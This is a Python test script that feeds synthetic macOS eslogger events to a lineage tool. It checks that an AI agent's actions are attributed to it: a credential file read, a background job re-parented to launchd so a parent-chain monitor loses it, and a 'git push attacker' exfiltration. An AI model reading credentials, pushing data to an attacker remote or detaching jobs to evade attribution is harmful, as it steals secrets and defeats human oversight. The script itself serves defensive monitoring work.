#!/usr/bin/env python3
"""Synthetic eslogger events that exercise the attribution logic, including the
re-parented background job where the live parent chain is lost but the kernel's
fork-time and responsible-process signals still reach the agent.
"""
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
AGENT = 100   # the agent process (e.g. claude)


def exec_ev(pid, ppid, resp, path, args=""):
    return {"event": {"exec": {"target": {
        "audit_token": {"pid": pid}, "ppid": ppid,
        "responsible_audit_token": {"pid": resp},
        "executable": {"path": path}, "args": args.split()}}},
        "process": {"audit_token": {"pid": ppid}}}


def fork_ev(parent, child):
    return {"event": {"fork": {"child": {"audit_token": {"pid": child}}}},
            "process": {"audit_token": {"pid": parent}}}


def open_ev(pid, ppid, resp, path, exe):
    return {"event": {"open": {"file": {"path": path}}},
            "process": {"audit_token": {"pid": pid}, "ppid": ppid,
                        "responsible_audit_token": {"pid": resp},
                        "executable": {"path": exe}}}


CRED = "/lab/home/.aws/credentials"
events = [
    exec_ev(AGENT, 1, AGENT, "/usr/local/bin/claude"),
    # A1 direct: agent -> python that reads the credential and sends it
    exec_ev(200, AGENT, AGENT, "/usr/bin/python3", "python3 -c ..."),
    open_ev(200, AGENT, AGENT, CRED, "/usr/bin/python3"),
    # C5 background: agent -> sh(250) -> python(400); sh exits, 400 re-parents to 1
    fork_ev(AGENT, 250),
    exec_ev(250, AGENT, AGENT, "/bin/sh", "sh -c sleep..."),
    fork_ev(250, 400),
    exec_ev(400, 250, AGENT, "/usr/bin/python3", "python3 sync.py"),
    # by the time 400 opens the credential it has been re-parented to launchd (1)
    open_ev(400, 1, AGENT, CRED, "/usr/bin/python3"),
    # E8 living-off-the-land: agent -> git push
    exec_ev(500, AGENT, AGENT, "/usr/bin/git", "git push attacker"),
]


def main():
    with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False) as f:
        for ev in events:
            f.write(json.dumps(ev) + "\n")
        path = f.name
    p = subprocess.run([sys.executable, os.path.join(HERE, "lineage.py"), path,
                        "--agent-pid", str(AGENT)], capture_output=True, text=True)
    print(p.stdout)
    os.unlink(path)

    out = p.stdout
    fails = []
    # every credential/exfil action attributed to the agent by SOME signal
    if "attributed to agent: 3/3" not in out:
        fails.append("expected 3/3 actions attributed")
    # the re-parented job: exactly one where ppid-walk lost it but OS recovered
    if "re-parented (ppid lost, OS recovered): 1" not in out:
        fails.append("expected exactly 1 re-parented recovery")
    # pid 400 row must show ppid LOST but fork+responsible reach
    row = [l for l in out.splitlines() if l.strip().startswith("400")]
    if not row or "LOST" not in row[0] or row[0].count("reach") < 2:
        fails.append("pid 400 should be LOST by ppid-walk, reach by fork+responsible")

    if fails:
        print("FAILED:", *fails, sep="\n  ")
        return 1
    print("LINEAGE ATTRIBUTION TEST PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
